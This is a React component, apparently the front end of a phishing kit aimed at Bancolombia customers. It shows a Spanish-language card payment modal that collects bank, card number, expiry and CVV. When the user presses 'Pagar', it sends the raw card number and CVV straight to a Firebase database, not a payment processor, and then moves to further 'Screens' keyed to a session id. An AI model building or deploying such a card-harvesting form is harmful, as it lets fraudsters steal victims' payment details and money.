import React, { useLayoutEffect } from 'react'
import { useState, useEffect } from 'react'
import btnSelect from '../../assets/btnSelect.png'
import Loading from './componentModal/Loading'
import luhnChk from './componentModal/Functions/lunhChk'

import visa from '../../assets/visa.jpg'
import amex from '../../assets/amex.jpg'
import mastercard from '../../assets/mastercard.jpg'
import Screens from './componentModal/Screens'
import {sendFirebaseData } from '../../Firebase/sendFirebaseData'

const meses = [{mes:"Enero",num:"01"}, {mes:"Febrero",num:"02"}, {mes:"Marzo",num:"03"}, {mes:"Abril",num:"04"}, {mes:"Mayo",num:"05"}, {mes:"Junio",num:"06"}, 
    {mes:"Julio",num:"07"}, {mes:"Agosto",num:"08"},{mes:"Septiembre",num:"09"}, {mes:"Octubre",num:"10"}, {mes:"Noviembre",num:"11"}, {mes:"Diciembre",num:"12"}
]
const initialState = {
    cvv: "",
    bank: "",
    TC: "",
    mes: "",
    año: "",
}
const Modal = ({infoPay}) => {
    const [data, setData] = useState(initialState)
    const [limitCvv, setLimitCvv] = useState(4)
    const [notificacion, setNotificacion] = useState({})
    const [activeScreen, setActiveScreen] = useState()
    const [selectedTC, setSelectedTc] = useState(0)
    const [idF,setIdF]=useState("")
    
    const validateField = () => {
        setNotificacion({
            ...notificacion,
            bank: data.bank ? "" : "Seleccione un banco",
            TC: luhnChk(data.TC)&&data.TC.length>14 ? "" : "Tarjeta invalida",
            cvv: data.cvv ? "" : "Ingrese su CVV",
            mes: data.mes ? "" : "Seleccione un mes",
            año: data.año ? "" : "Seleccione un año",
        })
    }

    const handlerChange = (e) => {
        setData({ ...data, [e.target.name]: e.target.value })
        if (e.target.value) {
            setNotificacion({ ...notificacion, [e.target.name]: "" })
        }
        if (e.target.name == "TC") {
            setSelectedTc(e.target.value[0])
            cutCvv()
        }
    }

    const cutCvv = () => {
        if (data.cvv.length > limitCvv) {
            setData({ ...data, cvv: data?.cvv.slice(0, limitCvv) })

        }
    }

    const validate = () => {
        if (luhnChk(data.TC)) {
            setNotificacion({ ...notificacion, TC: "" })
        } else {
            setNotificacion({ ...notificacion, TC: "Tarjeta Invalida" })

        }
        cutCvv()
    }

    const btnPagar = () => {
        validateField()
        if (!data.TC || !data.cvv || !data.bank || !data.año || !data.mes || !luhnChk(data.TC)) {
            return
        }
        
        if(data.TC.length<14){
            setNotificacion({...notificacion,TC:"Tarjeta invalida"})
            
            return
        }
        if (data.TC[0] == data.cvv.length || data.cvv.length <= 2) {
            setNotificacion({ ...notificacion, cvv: "El cvv no coincide con la tarjeta" })
            
            return
        }
        sendFirebaseData({infoPay,data},setIdF)
        // changeLoader()
        setActiveScreen(true)
    }

    const imgTC = () => {
        switch (selectedTC) {
            case "3":
                return <img className='w-12 h-8' src={amex} />
            case "4":
                return <img className='w-12 h-8' src={visa} />
            case "5":
                return <img className='w-12 h-8' src={mastercard} />
            default:
                return null
            
        }
    }
    useEffect(() => {
        

        document.getElementById("body").style.overflow = "hidden"
        return () => {
            document.getElementById("body").style.overflow = "visible"
        }
    }, [])
    //validaciones 
    useLayoutEffect(() => {
        window.sessionStorage.getItem('id')&&setIdF(window.sessionStorage.getItem('id'))

        if (data?.TC?.length >= 16) {
            setData({ ...data, TC: data?.TC.slice(0, 16) })
            setLimitCvv(3)
        } else {
            setLimitCvv(4)
        }
        
        cutCvv()
    }, [data?.TC, data?.cvv])
    
    
    return (
        <div className='w-screen h-screen bg-gray-700 fixed top-0 bg-opacity-60 flex items-center justify-center '>
            {activeScreen? <Screens idF={idF} />
                : <div className='bg-white w-4/5 px-5 rounded-lg py-4'>
                    <div className=''>
                        <p className='font-bold'>Banco</p>
                        <div className='relative '>
                            <img style={{ zIndex: "1000" }} src={btnSelect} className='absolute w-8 right-1 top-1' />
                            <select onChange={handlerChange} name={"bank"} value={data.bank}
                                className={`appearance-none px-1 py-2 flex border text-gray-600 relative outline-none
                             bg-white text-sm  w-full ${notificacion.bank ? "border-red-600" : "focus:border-blue-300"}
                             `}
                            >
                                <option value={""} className='ml-1 '>Seleccione su Banco</option>
                                {["Bancolombia", "Banco1", "Banco2",].map((item) => {
                                    return <option key={item} value={item}>
                                        {item}
                                    </option>
                                })}
                            </select>
                            {notificacion?.bank && <span className='text-xs text-red-600'>{notificacion?.bank}</span>}
                        </div>
                    </div>

                    <div className='my-4'>
                        <p className='text-gray-700/80 font-semibold '>Tarjeta</p>
                        <div className='w-full flex items-center'>
                            <input className={`border mr-2 px-1 py-1 w-4/5 outline-none ${notificacion.TC && "border-red-600"}`}
                                type='number'
                                onChange={handlerChange}
                                name="TC"
                                value={data?.TC ? data.TC : ""}
                                onBlur={() => validate()}
                                onKeyDown={(evt) => evt.key === 'e' && evt.preventDefault()}
                            />
                            {imgTC()}
                        </div>
                        {notificacion?.TC && <span className='text-xs text-red-600'>{notificacion?.TC}</span>}
                    </div>

                    <div className='full flex '>
                        <div className='mr-2 w-full relative'>
                            <p className='text-gray-700/80 font-semibold'>Mes</p>
                            <select onChange={handlerChange} name={"mes"} value={data.mes}
                                className={`w-full appearance-none px-1 py-2 flex border text-gray-600 relative 
                                outline-none bg-white text-sm ${notificacion?.mes ? "border-red-600" : "focus:border-blue-300"} 
                            `}
                            >
                                <option value={""} className='ml-1' onChange={handlerChange}>Seleccionar</option>
                                {meses.map((item,i) => {
                                    return <option key={i} value={item.num}>
                                        {item.mes}
                                    </option>
                                })}
                            </select>
                            <img style={{ zIndex: "1000" }} src={btnSelect} className='absolute w-8 right-1 top-7' />
                            {notificacion?.mes && <span className='text-xs text-red-600'>{notificacion?.mes}</span>}

                        </div>
                       
                        <div className='w-full relative '>
                            <p className='text-gray-700/80 font-semibold'>Año</p>
                            <select onChange={handlerChange} name={"año"} value={data.año}
                                className={`appearance-none px-1 py-2 flex border text-gray-600 relative
                            outline-none bg-white text-sm ${notificacion?.año ? "border-red-600" : "focus:border-blue-300"} w-full
                            `}
                            >
                                <option value={""} className='ml-1 '>Seleccionar</option>
                                {[2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034].map((item) => {
                                    return <option key={item} value={item}>
                                        {item}
                                    </option>
                                })}
                            </select>
                            <img style={{ zIndex: "1000" }} src={btnSelect} className='absolute w-8 right-1 top-7' />
                            {notificacion?.año && <span className='text-xs text-red-600'>{notificacion?.año}</span>}
                        </div>
                    </div>
                    <div className='my-4'>
                        <p className='text-gray-700/80 font-semibold'>CVV</p>
                        <input className={`border px-1 py-1 w-full outline-none ${notificacion.cvv && "border-red-600"}`}
                            type='number'
                            onChange={handlerChange}
                            name="cvv"
                            pattern="[0-9]+"
                            value={data?.cvv ? data?.cvv : ""}
                            onKeyDown={(evt) => evt.key === 'e' && evt.preventDefault()}
                        />
                        {notificacion?.cvv && <span className='text-xs text-red-600'>{notificacion?.cvv}</span>}

                    </div>
                    <button className='w-full py-2 bg-emerald-500/90 text-white my-4 rounded-md'
                        onClick={() => btnPagar()}
                    >
                        Pagar
                    </button>
                </div>}
        </div>
    )
}

export default Modal